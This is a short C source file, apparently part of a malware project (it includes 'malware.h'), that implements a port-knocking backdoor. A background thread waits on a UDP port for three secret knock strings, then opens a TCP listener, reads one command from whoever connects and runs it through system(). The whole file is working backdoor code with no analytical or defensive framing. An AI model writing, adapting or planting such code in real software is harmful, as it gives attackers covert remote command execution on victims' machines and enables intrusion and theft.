#include "malware.h"
#define BUFFER_SIZE 256

static void *port_knocking_thread(void *arg)
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
        return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(UDP_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 0;
    }
    char buffer[BUFFER_SIZE];
    int index = 0;
    struct sockaddr_in sender;
    socklen_t sender_len = sizeof(sender);
    while (1) {
        int n = recvfrom(sock, buffer, sizeof(buffer) - 1, 0, (struct sockaddr *)&sender, &sender_len);
        if (n > 0) {
            buffer[n] = '\0';
            if (index == 0 && strcmp(buffer, KNOCK1) == 0) {
                index++;
            } else if (index == 1 && strcmp(buffer, KNOCK2) == 0) {
                index++;
            } else if (index == 2 && strcmp(buffer, KNOCK3) == 0) {
                int tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
                if (tcp_sock < 0)
                    break;
                struct sockaddr_in tcp_addr;
                tcp_addr.sin_family = AF_INET;
                tcp_addr.sin_addr.s_addr = INADDR_ANY;
                tcp_addr.sin_port = htons(TCP_PORT);
                
                if (bind(tcp_sock, (struct sockaddr *)&tcp_addr, sizeof(tcp_addr)) < 0) {
                    close(tcp_sock);
                    break;
                }
                listen(tcp_sock, 1);
                int client = accept(tcp_sock, 0, 0);
                if (client >= 0) {
                    char cmd[256];
                    int len = read(client, cmd, sizeof(cmd) - 1);
                    if (len > 0) {
                        cmd[len] = '\0';
                        system(cmd);
                    }
                    close(client);
                }
                close(tcp_sock);
                index = 0;
            } else {
                index = 0;
            }
        }
    }
    close(sock);
    return 0;
}

void start_port_knocking(void)
{
    pthread_t tid;
    if (pthread_create(&tid, 0, port_knocking_thread, 0) != 0) {
        perror("Échec de la création du thread de port knocking");
    } else {
        pthread_detach(tid);
    }
}
